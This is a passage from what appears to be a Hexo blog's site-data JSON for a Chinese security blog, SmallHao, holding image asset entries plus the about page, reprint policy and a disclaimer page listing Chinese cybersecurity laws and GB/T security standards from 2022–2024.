0231124162353785.png","hash":"b48aa4b8bad2d72e0a3695fcbe827a5fcf9d7a41","modified":1742566177887},{"_id":"public/images/信息收集-敏感信息收集/image-20231124163506452.png","hash":"ac2b722f051e8310fa1d7b8a3ee33b87e7453459","modified":1742566177887},{"_id":"public/images/202205301450337.png","hash":"1b6f9dc3c4a6832a7fec4f3a8bd11bf09debfb7b","modified":1742566177887},{"_id":"public/images/信息收集-敏感信息收集/image-20231124163836496.png","hash":"6e665a09ce367d629125dc78dee1e23183375ba9","modified":1742566177887},{"_id":"public/images/202205261949206.png","hash":"2e5b7116b7ac1f7c08c7ee38e74b0175080d70a2","modified":1742566177887},{"_id":"public/images/202205270847820.png","hash":"e42aceb67ea99df78131f3c364ec1da616c4076a","modified":1742566177887},{"_id":"public/images/流量分析-Webshell/image-20241022143146378.png","hash":"e21dbd568ccbc14401e0bfa409ac16ed613da3c9","modified":1742566177887},{"_id":"public/images/202205301154200.png","hash":"e66a0f3bec2d9c057b41783452911b69ced20371","modified":1742566177887},{"_id":"public/images/202205301453694.png","hash":"67622526ff26db54663e5fd75a8dcd27f1b36f58","modified":1742566177887},{"_id":"public/images/202205271016580.png","hash":"366415a9a6646e7ab03a05a739e0a75d381fa5d3","modified":1742566177887},{"_id":"public/images/202205270946813.png","hash":"74eeb677bcd6a4a2467d9b6eeeb94fe29e5f57d4","modified":1742566177887},{"_id":"public/images/202205301154538.png","hash":"7b689cd5d29080ab51b5eab20cae719184b90119","modified":1742566177887},{"_id":"public/img/friend_404.gif","hash":"4c0a482bce3710942aff900d62c48333827e5a53","modified":1742566177887},{"_id":"public/images/202205261933974.png","hash":"a093575e4658fd1f4cd6dc6baa1b2f3f1c91c5c8","modified":1742566177887},{"_id":"public/images/202205261913186.png","hash":"6adf6c3812bbba4eac0f67ef9e068d4ec0ac2757","modified":1742566177887},{"_id":"public/images/202205270959676.png","hash":"a61e2840f35aaf93099c3de885d8c470146781e4","modified":1742566177887},{"_id":"public/img/loading.gif","hash":"b9e8d78b86bc48d565e26c8c1ea275c2c758fb0d","modified":1742566177887}],"Category":[],"Data":[],"Page":[{"title":"自我介绍","top_img":"https://img2.baidu.com/it/u=3175154587,194260481&fm=253&fmt=auto&app=120&f=JPEG?w=800&h=500","date":"2025-03-21T13:37:41.000Z","type":null,"updated":"2025-03-21T13:59:15.384Z","comments":1,"description":null,"keywords":null,"mathjax":null,"katex":null,"aside":null,"aplayer":null,"highlight_shrink":null,"top_single_background":null,"_content":"一、自我介绍\n嘿，大家好！我是SmallHao，一个在代码海洋中游弋、喜欢解开网络安全迷宫的秘密探险家。如果你认为黑客只是电影里那些戴着墨镜敲键盘的大佬，那么欢迎来到现实版——我们不戴墨镜（除非阳光太刺眼），但我们确实会敲很多键盘！\n\n二、我的职业之旅\n作为一名黑客，我的日常就像是在玩一场无尽的游戏，只不过这个游戏里没有存档点，每一个决策都至关重要。从破解复杂的加密算法到帮助公司发现并修复安全漏洞，每一天都是新的挑战。但别担心，我不是那种半夜三点还在你电脑上安装奇怪软件的家伙（至少现在不是啦）。\n\n三、博客的目的与内容\n这个博客是我分享这些冒险故事和技术见解的地方。在这里，你会看到：\n\n技术探讨而非指导：请注意，本博客更像是一个讨论如何用钥匙开锁而不是教你去撬别人家门的地方。所有内容仅供学习和研究使用，绝对不含任何破坏性的建议。\n遵守法律法规：在这个数字世界里，规则和现实生活一样重要。因此，在这里，我们不仅学习技术，也学习如何成为网络世界的良好公民。记住，最好的黑客是那些知道何时以及如何正确使用他们技能的人。\n免责声明：虽然我会尽力提供准确的信息，但互联网上的东西就像魔法，有时可能不如预期那样工作。所以，请带着批判的眼光阅读，并自行负责判断信息的适用性和合法性。\n四、加入我们的社区\n无论你是对网络安全充满热情的新手，还是经验丰富的老鸟，我都非常期待能和你们一起讨论最新的技术和趋势。如果有什么问题或者想法想要分享，或者只是想聊聊今天遇到的有趣bug，随时可以通过[电子邮箱地址]联系我。也许我们可以一起解决那个困扰你已久的难题！\n\n五、结束语\n感谢您花时间了解我！希望我的博客不仅能带给你知识，还能带来欢笑。毕竟，即使是在最严肃的技术领域，保持一颗轻松愉快的心也是很重要的。愿你在探索技术的道路上每一步都充满惊喜！\n<div style=\"color: red;\">SmallHao</div>","source":"about/index.md","raw":"---\ntitle: 自我介绍\ntop_img: https://img2.baidu.com/it/u=3175154587,194260481&fm=253&fmt=auto&app=120&f=JPEG?w=800&h=500\ndate: 2025-03-21 21:37:41\ntype:\nupdated:\ncomments:\ndescription:\nkeywords:\nmathjax:\nkatex:\naside:\naplayer:\nhighlight_shrink:\ntop_single_background:\n---\n一、自我介绍\n嘿，大家好！我是SmallHao，一个在代码海洋中游弋、喜欢解开网络安全迷宫的秘密探险家。如果你认为黑客只是电影里那些戴着墨镜敲键盘的大佬，那么欢迎来到现实版——我们不戴墨镜（除非阳光太刺眼），但我们确实会敲很多键盘！\n\n二、我的职业之旅\n作为一名黑客，我的日常就像是在玩一场无尽的游戏，只不过这个游戏里没有存档点，每一个决策都至关重要。从破解复杂的加密算法到帮助公司发现并修复安全漏洞，每一天都是新的挑战。但别担心，我不是那种半夜三点还在你电脑上安装奇怪软件的家伙（至少现在不是啦）。\n\n三、博客的目的与内容\n这个博客是我分享这些冒险故事和技术见解的地方。在这里，你会看到：\n\n技术探讨而非指导：请注意，本博客更像是一个讨论如何用钥匙开锁而不是教你去撬别人家门的地方。所有内容仅供学习和研究使用，绝对不含任何破坏性的建议。\n遵守法律法规：在这个数字世界里，规则和现实生活一样重要。因此，在这里，我们不仅学习技术，也学习如何成为网络世界的良好公民。记住，最好的黑客是那些知道何时以及如何正确使用他们技能的人。\n免责声明：虽然我会尽力提供准确的信息，但互联网上的东西就像魔法，有时可能不如预期那样工作。所以，请带着批判的眼光阅读，并自行负责判断信息的适用性和合法性。\n四、加入我们的社区\n无论你是对网络安全充满热情的新手，还是经验丰富的老鸟，我都非常期待能和你们一起讨论最新的技术和趋势。如果有什么问题或者想法想要分享，或者只是想聊聊今天遇到的有趣bug，随时可以通过[电子邮箱地址]联系我。也许我们可以一起解决那个困扰你已久的难题！\n\n五、结束语\n感谢您花时间了解我！希望我的博客不仅能带给你知识，还能带来欢笑。毕竟，即使是在最严肃的技术领域，保持一颗轻松愉快的心也是很重要的。愿你在探索技术的道路上每一步都充满惊喜！\n<div style=\"color: red;\">SmallHao</div>","path":"about/index.html","layout":"page","_id":"cm8iuwsqz0000rcn1d94x5qii","content":"<p>一、自我介绍<br>嘿，大家好！我是SmallHao，一个在代码海洋中游弋、喜欢解开网络安全迷宫的秘密探险家。如果你认为黑客只是电影里那些戴着墨镜敲键盘的大佬，那么欢迎来到现实版——我们不戴墨镜（除非阳光太刺眼），但我们确实会敲很多键盘！</p>\n<p>二、我的职业之旅<br>作为一名黑客，我的日常就像是在玩一场无尽的游戏，只不过这个游戏里没有存档点，每一个决策都至关重要。从破解复杂的加密算法到帮助公司发现并修复安全漏洞，每一天都是新的挑战。但别担心，我不是那种半夜三点还在你电脑上安装奇怪软件的家伙（至少现在不是啦）。</p>\n<p>三、博客的目的与内容<br>这个博客是我分享这些冒险故事和技术见解的地方。在这里，你会看到：</p>\n<p>技术探讨而非指导：请注意，本博客更像是一个讨论如何用钥匙开锁而不是教你去撬别人家门的地方。所有内容仅供学习和研究使用，绝对不含任何破坏性的建议。<br>遵守法律法规：在这个数字世界里，规则和现实生活一样重要。因此，在这里，我们不仅学习技术，也学习如何成为网络世界的良好公民。记住，最好的黑客是那些知道何时以及如何正确使用他们技能的人。<br>免责声明：虽然我会尽力提供准确的信息，但互联网上的东西就像魔法，有时可能不如预期那样工作。所以，请带着批判的眼光阅读，并自行负责判断信息的适用性和合法性。<br>四、加入我们的社区<br>无论你是对网络安全充满热情的新手，还是经验丰富的老鸟，我都非常期待能和你们一起讨论最新的技术和趋势。如果有什么问题或者想法想要分享，或者只是想聊聊今天遇到的有趣bug，随时可以通过[电子邮箱地址]联系我。也许我们可以一起解决那个困扰你已久的难题！</p>\n<p>五、结束语<br>感谢您花时间了解我！希望我的博客不仅能带给你知识，还能带来欢笑。毕竟，即使是在最严肃的技术领域，保持一颗轻松愉快的心也是很重要的。愿你在探索技术的道路上每一步都充满惊喜！</p>\n<div style=\"color: red;\">SmallHao</div>","cover":false,"excerpt":"","more":"<p>一、自我介绍<br>嘿，大家好！我是SmallHao，一个在代码海洋中游弋、喜欢解开网络安全迷宫的秘密探险家。如果你认为黑客只是电影里那些戴着墨镜敲键盘的大佬，那么欢迎来到现实版——我们不戴墨镜（除非阳光太刺眼），但我们确实会敲很多键盘！</p>\n<p>二、我的职业之旅<br>作为一名黑客，我的日常就像是在玩一场无尽的游戏，只不过这个游戏里没有存档点，每一个决策都至关重要。从破解复杂的加密算法到帮助公司发现并修复安全漏洞，每一天都是新的挑战。但别担心，我不是那种半夜三点还在你电脑上安装奇怪软件的家伙（至少现在不是啦）。</p>\n<p>三、博客的目的与内容<br>这个博客是我分享这些冒险故事和技术见解的地方。在这里，你会看到：</p>\n<p>技术探讨而非指导：请注意，本博客更像是一个讨论如何用钥匙开锁而不是教你去撬别人家门的地方。所有内容仅供学习和研究使用，绝对不含任何破坏性的建议。<br>遵守法律法规：在这个数字世界里，规则和现实生活一样重要。因此，在这里，我们不仅学习技术，也学习如何成为网络世界的良好公民。记住，最好的黑客是那些知道何时以及如何正确使用他们技能的人。<br>免责声明：虽然我会尽力提供准确的信息，但互联网上的东西就像魔法，有时可能不如预期那样工作。所以，请带着批判的眼光阅读，并自行负责判断信息的适用性和合法性。<br>四、加入我们的社区<br>无论你是对网络安全充满热情的新手，还是经验丰富的老鸟，我都非常期待能和你们一起讨论最新的技术和趋势。如果有什么问题或者想法想要分享，或者只是想聊聊今天遇到的有趣bug，随时可以通过[电子邮箱地址]联系我。也许我们可以一起解决那个困扰你已久的难题！</p>\n<p>五、结束语<br>感谢您花时间了解我！希望我的博客不仅能带给你知识，还能带来欢笑。毕竟，即使是在最严肃的技术领域，保持一颗轻松愉快的心也是很重要的。愿你在探索技术的道路上每一步都充满惊喜！</p>\n<div style=\"color: red;\">SmallHao</div>"},{"title":"分类","date":"2024-10-21T19:36:48.000Z","aside":false,"top_img":false,"type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2024-10-22 03:36:48\naside: false\ntop_img: false\ntype: \"categories\"\n---","updated":"2025-03-20T02:07:41.650Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cm8iuwsr30002rcn1f3gxaxt8","content":"","cover":false,"excerpt":"","more":""},{"title":"标签","date":"2024-12-02T05:05:02.000Z","type":"tags","comments":0,"top_img":false,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2024-12-02 13:05:02\ntype: \"tags\"\ncomments: false\ntop_img: false\n---","updated":"2025-03-20T02:04:11.574Z","path":"tags/index.html","layout":"page","_id":"cm8iuwsr50004rcn1hho37kgk","content":"","cover":false,"excerpt":"","more":""},{"title":"转载须知","top_img":"https://img.090227.xyz/file/ae62475a131f3734a201c.png","date":"2024-12-02T06:57:38.000Z","type":null,"updated":"2025-03-20T02:35:45.246Z","comments":1,"description":null,"keywords":null,"mathjax":null,"katex":null,"aside":null,"aplayer":null,"highlight_shrink":null,"top_single_background":null,"_content":"#### SmallHao内容转载须知\n\n十分感谢您对SmallHao平台的认可。作为一家安全新媒体，我们致力于传播有思想的安全内容。传播有道，希望每一次原创的发声不仅能被看见，也都能得到尊重。因此，若需转载原创文章，请先获取SmallHao平台授权，未经授权禁止转载。\n\n### 转载至网站平台：\n\n1\\. 转载SmallHao原创文章，请注明【原文来自SmallHao、原文作者以及原文链接】\n\n2\\. 请在文末备注以下信息：  \n声明：本文经SmallHao授权发布，转载请联系SmallHao平台。\n\n3\\. 转载可修改标题，可稍微调整语句内容，但不可大范围改动原文\n \nSmallHao：有思想的安全新媒体。  \n声明：本文经SmallHao授权发布，转载请联系SmallHao平台。  \n**转载文章产生的任何责任纠纷，与SmallHao无关；请尊重知识产权，不满足以上转载条件的，视为无效授权，SmallHao平台保留追究责任的权利。**","source":"转载须知/index.md","raw":"---\ntitle: 转载须知\ntop_img: https://img.090227.xyz/file/ae62475a131f3734a201c.png\ndate: 2024-12-02 14:57:38\ntype:\nupdated:\ncomments:\ndescription:\nkeywords:\nmathjax:\nkatex:\naside:\naplayer:\nhighlight_shrink:\ntop_single_background:\n---\n#### SmallHao内容转载须知\n\n十分感谢您对SmallHao平台的认可。作为一家安全新媒体，我们致力于传播有思想的安全内容。传播有道，希望每一次原创的发声不仅能被看见，也都能得到尊重。因此，若需转载原创文章，请先获取SmallHao平台授权，未经授权禁止转载。\n\n### 转载至网站平台：\n\n1\\. 转载SmallHao原创文章，请注明【原文来自SmallHao、原文作者以及原文链接】\n\n2\\. 请在文末备注以下信息：  \n声明：本文经SmallHao授权发布，转载请联系SmallHao平台。\n\n3\\. 转载可修改标题，可稍微调整语句内容，但不可大范围改动原文\n \nSmallHao：有思想的安全新媒体。  \n声明：本文经SmallHao授权发布，转载请联系SmallHao平台。  \n**转载文章产生的任何责任纠纷，与SmallHao无关；请尊重知识产权，不满足以上转载条件的，视为无效授权，SmallHao平台保留追究责任的权利。**","path":"转载须知/index.html","layout":"page","_id":"cm8iuwsr60005rcn1d7dygmnb","content":"<h4 id=\"SmallHao内容转载须知\"><a href=\"#SmallHao内容转载须知\" class=\"headerlink\" title=\"SmallHao内容转载须知\"></a>SmallHao内容转载须知</h4><p>十分感谢您对SmallHao平台的认可。作为一家安全新媒体，我们致力于传播有思想的安全内容。传播有道，希望每一次原创的发声不仅能被看见，也都能得到尊重。因此，若需转载原创文章，请先获取SmallHao平台授权，未经授权禁止转载。</p>\n<h3 id=\"转载至网站平台：\"><a href=\"#转载至网站平台：\" class=\"headerlink\" title=\"转载至网站平台：\"></a>转载至网站平台：</h3><p>1. 转载SmallHao原创文章，请注明【原文来自SmallHao、原文作者以及原文链接】</p>\n<p>2. 请在文末备注以下信息：<br>声明：本文经SmallHao授权发布，转载请联系SmallHao平台。</p>\n<p>3. 转载可修改标题，可稍微调整语句内容，但不可大范围改动原文</p>\n<p>SmallHao：有思想的安全新媒体。<br>声明：本文经SmallHao授权发布，转载请联系SmallHao平台。<br><strong>转载文章产生的任何责任纠纷，与SmallHao无关；请尊重知识产权，不满足以上转载条件的，视为无效授权，SmallHao平台保留追究责任的权利。</strong></p>\n","cover":false,"excerpt":"","more":"<h4 id=\"SmallHao内容转载须知\"><a href=\"#SmallHao内容转载须知\" class=\"headerlink\" title=\"SmallHao内容转载须知\"></a>SmallHao内容转载须知</h4><p>十分感谢您对SmallHao平台的认可。作为一家安全新媒体，我们致力于传播有思想的安全内容。传播有道，希望每一次原创的发声不仅能被看见，也都能得到尊重。因此，若需转载原创文章，请先获取SmallHao平台授权，未经授权禁止转载。</p>\n<h3 id=\"转载至网站平台：\"><a href=\"#转载至网站平台：\" class=\"headerlink\" title=\"转载至网站平台：\"></a>转载至网站平台：</h3><p>1. 转载SmallHao原创文章，请注明【原文来自SmallHao、原文作者以及原文链接】</p>\n<p>2. 请在文末备注以下信息：<br>声明：本文经SmallHao授权发布，转载请联系SmallHao平台。</p>\n<p>3. 转载可修改标题，可稍微调整语句内容，但不可大范围改动原文</p>\n<p>SmallHao：有思想的安全新媒体。<br>声明：本文经SmallHao授权发布，转载请联系SmallHao平台。<br><strong>转载文章产生的任何责任纠纷，与SmallHao无关；请尊重知识产权，不满足以上转载条件的，视为无效授权，SmallHao平台保留追究责任的权利。</strong></p>\n"},{"title":"免责声明","top_img":"https://img.090227.xyz/file/ae62475a131f3734a201c.png","date":"2024-12-02T06:49:45.000Z","type":null,"updated":"2025-03-20T02:35:26.808Z","comments":1,"description":null,"keywords":null,"mathjax":null,"katex":null,"aside":null,"aplayer":null,"highlight_shrink":null,"top_single_background":null,"_content":"# SmallHao免责声明 #\n\n**【免责声明】本博客所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本博客无关。**\n\n一个网络安全法律法规、安全政策、国家标准、行业标准知识库。\n\n## 资源导航\n\n- 公安部公布打击黑客犯罪 10 起典型案例：https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA\n- 公安部公布“百日行动”期间打击网络违法犯罪十大典型案例：https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml\n- 国家标准全文公开系统：http://openstd.samr.gov.cn/bzgk/gb/index\n- 国家法律法规数据库：https://flk.npc.gov.cn/index.html\n- 全国标准信息公共服务平台：http://std.samr.gov.cn/\n- 自 2017 年 1 月 1 日后新发布的标准将在发布后 20 个工作日内公开\n- 国家互联网信息办公室 ：http://www.cac.gov.cn/\n\n## 法律法规\n\n### 常见标准代号\n\n- 强制性国家标准代号 GB\n- 推荐性国家标准代号 GB/T\n- 指导性技术文件代号 GB/Z\n- 实物标准代号 GSB\n\n### 2024 年新发布\n\n| 标准号               | 标准名称                                                          | 发布日期       | 实施日期       |\n| ----------------- | ------------------------------------------------------------- | ---------- | ---------- |\n| GB/T 44810.2-2024 | IPv6 网络安全设备技术要求 第 2 部分：Web 应用防护系统（WAF）                        | 2024-10-26 | 2025-02-01 |\n| GB/T 44810.1-2024 | IPv6 网络安全设备技术要求 第 1 部分：防火墙                                    | 2024-10-26 | 2025-02-01 |\n| GB/T 44810.3-2024 | IPv6 网络安全设备技术要求 第 3 部分：入侵防御系统（IPS）                            | 2024-10-26 | 2025-02-01 |\n| GB/T 44862-2024   | 网络安全技术 网络弹性评价准则                                               | 2024-10-26 | 2025-05-01 |\n| GB/T 31500-2024   | 网络安全技术 存储介质数据恢复服务安全规范                                         | 2024-10-26 | 2025-05-01 |\n| GB/T 44778-2024   | 汽车诊断接口信息安全技术要求及试验方法                                           | 2024-10-26 | 2024-10-26 |\n| GB/T 44774-2024   | 汽车信息安全应急响应管理规范                                                | 2024-10-26 | 2024-10-26 |\n| GB/T 44602-2024   | 网络安全技术 智能门锁网络安全技术规范                                           | 2024-09-29 | 2025-04-01 |\n| GB/T 44462.2-2024 | 工业互联网企业网络安全 第 2 部分：平台企业防护要求                                   | 2024-09-29 | 2025-01-01 |\n| GB/T 44462.3-2024 | 工业互联网企业网络安全 第 3 部分：标识解析企业防护要求                                 | 2024-09-29 | 2025-01-01 |\n| GB/T 44462.1-2024 | 工业互联网企业网络安全 第 1 部分：应用工业互联网的工业企业防护要求                           | 2024-09-29 | 2025-01-01 |\n| GB/T 15852.2-2024 | 网络安全技术 消息鉴别码 第 2 部分：采用专门设计的杂凑函数的机制                            | 2024-09-29 | 2025-04-01 |\n| GB/T 29244-2024   | 网络安全技术 办公设备安全规范                                               | 2024-09-29 | 2025-04-01 |\n| GB/T 20279-2024   | 网络安全技术 网络和终端隔离产品技术规范                                          | 2024-09-29 | 2025-04-01 |\n| GB/T 22081-2024   | 网络安全技术 信息安全控制                                                 | 2024-09-29 | 2025-04-01 |\n| GB/T 15843.2-2024 | 网络安全技术 实体鉴别 第 2 部分：采用鉴别式加密的机制                                 | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.1-2024 | 网络安全技术 杂凑函数 第 1 部分：总则                                         | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.2-2024 | 网络安全技术 杂凑函数 第 2 部分：采用分组密码的杂凑函数                                | 2024-09-29 | 2025-04-01 |\n| GB/T 18238.3-2024 | 网络安全技术 杂凑函数 第 3 部分：专门设计的杂凑函数                                  | 2024-09-29 | 2025-04-01 |\n| GB/T 44585.1-2024 | 风险管理在接入 IT 网络的医疗器械中的应用 第 1 部分：联网医疗器械或健康软件在其实施和使用中的安全、有效性和网络安全 | 2024-09-29 | 2026-04-01 |\n| GB 44495-2024     | 汽车整车信息安全技术要求                                                  | 2024-08-23 | 2026-01-01 |\n| GB/T 43848-2024   | 网络安全技术 软件产品开源代码安全评价方法                                         | 2024-04-25 | 2024-11-01 |\n| GB/T 43779-2024   | 网络安全技术 基于密码令牌的主叫用户可信身份鉴别技术规范                                  | 2024-04-25 | 2024-11-01 |\n| GB/T 43741-2024   | 网络安全技术 网络安全众测服务要求                                             | 2024-04-25 | 2024-11-01 |\n| GB/T 43698-2024   | 网络安全技术 软件供应链安全要求                                              | 2024-04-25 | 2024-11-01 |\n| GB/T 43696-2024   | 网络安全技术 零信任参考体系架构                                              | 2024-04-25 | 2024-11-01 |\n| GB/T 43694-2024   | 网络安全技术 证书应用综合服务接口规范                                           | 2024-04-25 | 2024-11-01 |\n| GB/T 33565-2024   | 网络安全技术 无线局域网接入系统安全技术要求                                        | 2024-04-25 | 2024-11-01 |\n| GB/T 33563-2024   | 网络安全技术 无线局域网客户端安全技术要求                                         | 2024-04-25 | 2024-11-01 |\n| GB/T 30270-2024   | 网络安全技术 信息技术安全评估方法                                             | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.5-2024 | 网络安全技术 信息技术安全评估准则 第 5 部分：预定义的安全要求包                            | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.4-2024 | 网络安全技术 信息技术安全评估准则 第 4 部分：评估方法和活动的规范框架                         | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.3-2024 | 网络安全技术 信息技术安全评估准则 第 3 部分：安全保障组件                               | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.2-2024 | 网络安全技术 信息技术安全评估准则 第 2 部分：安全功能组件                               | 2024-04-25 | 2024-11-01 |\n| GB/T 18336.1-2024 | 网络安全技术 信息技术安全评估准则 第 1 部分：简介和一般模型                              | 2024-04-25 | 2024-11-01 |\n| GB/T 17903.3-2024 | 网络安全技术 抗抵赖 第 3 部分：用非对称技术的机制                                   | 2024-03-15 | 2024-10-01 |\n| GB/T 31497-2024   | 网络安全技术 信息安全管理 监视、测量、分析和评价                                     | 2024-03-15 | 2024-10-01 |\n| GB/T 17903.1-2024 | 网络安全技术 抗抵赖 第 1 部分：概述                                          | 2024-03-15 | 2024-10-01 |\n| GB/T 15843.4-2024 | 网络安全技术 实体鉴别 第 4 部分：用密码校验函数的机制                                 | 2024-03-15 | 2024-10-01 |\n\n### 2023 年新发布\n\n| 标准号               | 标准名称                                  | 发布日期       | 实施日期       |\n| ----------------- | ------------------------------------- | ---------- | ---------- |\n| GB/T 43578-2023   | 信息安全技术 通用密码服务接口规范                     | 2023-12-28 | 2024-07-01 |\n| GB/T 43577.1-2023 | 信息安全技术 电子发现 第 1 部分：概述和概念              | 2023-12-28 | 2024-07-01 |\n| GB/T 35290-2023   | 信息安全技术 射频识别（RFID）系统安全技术规范             | 2023-12-28 | 2024-07-01 |\n| GB/T 43557-2023   | 信息安全技术 网络安全信息报送指南                     | 2023-12-28 | 2024-07-01 |\n| GB/T 29246-2023   | 信息安全技术 信息安全管理体系 概述和词汇                 | 2023-12-28 | 2024-07-01 |\n| GB/T 43532-2023   | 核电厂仪表和控制系统网络安全防范管控                    | 2023-12-28 | 2024-04-01 |\n| GB/T 43269-2023   | 信息安全技术 网络安全应急能力评估准则                   | 2023-11-27 | 2024-06-01 |\n| GB/T 43435-2023   | 信息安全技术 移动互联网应用程序（App）软件开发工具包（SDK）安全要求 | 2023-11-27 | 2024-06-01 |\n| GB/T 43445-2023   | 信息安全技术 移动智能终端预置应用软件基本安全要求             | 2023-11-27 | 2024-06-01 |\n| GB/T 43026-2023   | 公共安全视频监控联网信息安全测试规范                    | 2023-09-07 | 2024-10-01 |\n| GB/T 42971-2023   | 第三方电子合同服务平台信息安全技术要求                   | 2023-09-07 | 2024-04-01 |\n| GB/T 43046-2023   | 信息技术服务 应对突发公共安全事件的信息技术应急风险管理          | 2023-09-07 | 2024-04-01 |\n| GB/T 43207-2023   | 信息安全技术 信息系统密码应用设计指南                   | 2023-09-07 | 2024-04-01 |\n| GB/T 43206-2023   | 信息安全技术 信息系统密码应用测评要求                   | 2023-09-07 | 2024-04-01 |\n| GB/T 32916-2023   | 信息安全技术 信息安全控制评估指南                     | 2023-09-07 | 2024-04-01 |\n| GB/T 32914-2023   | 信息安全技术 网络安全服务能力要求                     | 2023-09-07 | 2024-04-01 |\n| GB/T 42884-2023   | 信息安全技术 移动互联网应用程序（App）生命周期安全管理指南       | 2023-08-06 | 2024-03-01 |\n| GB/T 42888-2023   | 信息安全技术 机器学习算法安全评估规范                   | 2023-08-06 | 2024-03-01 |\n| GB/T 35274-2023   | 信息安全技术 大数据服务安全能力要求                    | 2023-08-06 | 2024-03-01 |\n| GB/Z 42885-2023   | 信息安全技术 网络安全信息共享指南                     | 2023-08-06 | 2024-03-01 |\n| GB/T 42926-2023   | 金融信息系统网络安全风险评估规范                      | 2023-08-06 | 2023-12-01 |\n| GB/T 42708-2023   | 金融网络安全威胁信息共享指南                        | 2023-08-06 | 2023-08-06 |\n| GB/T 42589-2023   | 信息安全技术 电子凭据服务安全规范                     | 2023-05-23 | 2023-12-01 |\n| GB/T 24364-2023   | 信息安全技术 信息安全风险管理实施指南                   | 2023-05-23 | 2023-12-01 |\n| GB/T 31168-2023   | 信息安全技术 云计算服务安全能力要求                    | 2023-05-23 | 2023-12-01 |\n| GB/T 31167-2023   | 信息安全技术 云计算服务安全指南                      | 2023-05-23 | 2023-12-01 |\n| GB/T 42574-2023   | 信息安全技术 个人信息处理中告知和同意的实施指南              | 2023-05-23 | 2023-12-01 |\n| GB/T 42572-2023   | 信息安全技术 可信执行环境服务规范                     | 2023-05-23 | 2023-12-01 |\n| GB/T 42583-2023   | 信息安全技术 政务网络安全监测平台技术规范                 | 2023-05-23 | 2023-12-01 |\n| GB/T 42571-2023   | 信息安全技术 区块链信息服务安全规范                    | 2023-05-23 | 2023-12-01 |\n| GB/T 42582-2023   | 信息安全技术 移动互联网应用程序（App）个人信息安全测评规范       | 2023-05-23 | 2023-12-01 |\n| GB/T 42570-2023   | 信息安全技术 区块链技术安全框架                      | 2023-05-23 | 2023-12-01 |\n| GB/T 42564-2023   | 信息安全技术 边缘计算安全技术要求                     | 2023-05-23 | 2023-12-01 |\n| GB/T 28451-2023   | 信息安全技术 网络入侵防御产品技术规范                   | 2023-05-23 | 2023-12-01 |\n| GB/T 20945-2023   | 信息安全技术 网络安全审计产品技术规范                   | 2023-05-23 | 2023-12-01 |\n| GB/T 30282-2023   | 信息安全技术 反垃圾邮件产品技术规范                    | 2023-05-23 | 2023-12-01 |\n| GB/T 20986-2023   | 信息安全技术 网络安全事件分类分级指南                   | 2023-05-23 | 2023-12-01 |\n| GB/T 42573-2023   | 信息安全技术 网络身份服务安全技术要求                   | 2023-05-23 | 2023-12-01 |\n| GB/T 35282-2023   | 信息安全技术 电子政务移动办公系统安全技术规范               | 2023-05-23 | 2023-12-01 |\n| GB/T 32920-2023   | 信息安全技术 行业间和组织间通信的信息安全管理               | 2023-05-23 | 2023-12-01 |\n| GB/T 42447-2023   | 信息安全技术 电信领域数据安全指南                     | 2023-03-17 | 2023-10-01 |\n| GB/T 42453-2023   | 信息安全技术 网络安全态势感知通用技术要求                 | 2023-03-17 | 2023-10-01 |\n| GB/T 42460-2023   | 信息安全技术 个人信息去标识化效果评估指南                 | 2023-03-17 | 2023-10-01 |\n| GB/T 32922-2023   | 信息安全技术 IPSec VPN 安全接入基本要求与实施指南        | 2023-03-17 | 2023-10-01 |\n| GB/T 21054-2023   | 信息安全技术 公钥基础设施 PKI 系统安全测评方法            | 2023-03-17 | 2023-10-01 |\n| GB/T 21053-2023   | 信息安全技术 公钥基础设施 PKI 系统安全技术要求            | 2023-03-17 | 2023-10-01 |\n| GB/T 20274.1-2023 | 信息安全技术 信息系统安全保障评估框架 第 1 部分：简介和一般模型    | 2023-03-17 | 2023-10-01 |\n| GB/T 33134-2023   | 信息安全技术 公共域名服务系统安全要求                   | 2023-03-17 | 2023-10-01 |\n| GB/T 42461-2023   | 信息安全技术 网络安全服务成本度量指南                   | 2023-03-17 | 2023-10-01 |\n| GB/T 42446-2023   | 信息安全技术 网络安全从业人员能力基本要求                 | 2023-03-17 | 2023-10-01 |\n\n### 2022 年新发布\n\n| 标准号                                                       | 名称                                                         | 发布日期   | 实施日期   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------- | ---------- |\n| [GB 42250-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=97F140EC1874D4C25CB8DC53B1D102D0) | 信息安全技术 网络安全专用产品安全技术要求                    | 2022-12-29 | 2023-07-01 |\n| [GB/T 41817-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=62C795EBF1BF0200A7161718CEFAABA8) | 信息安全技术 个人信息安全工程指南                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41819-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=BE74B9780B8C4852D62CF47F282478B6) | 信息安全技术 人脸识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41806-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=EACA08F5F077771ACE82FBE7987F40AE) | 信息安全技术 基因识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41773-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2137495F032BA9E69A753016027D271C) | 信息安全技术 步态识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 41807-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=AF1E9400C0F9C7051C33F773274825EA) | 信息安全技术 声纹识别数据安全要求                            | 2022-10-14 | 2023-05-01 |\n| [GB/T 42014-2022](https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=9679A3BF5D736D7FC92FD8157AAAAC82) | 信息安全技术 网上购物服务数据安全要求                        | 2022-10-14 | 2023-05-01 |\n| [GB/T 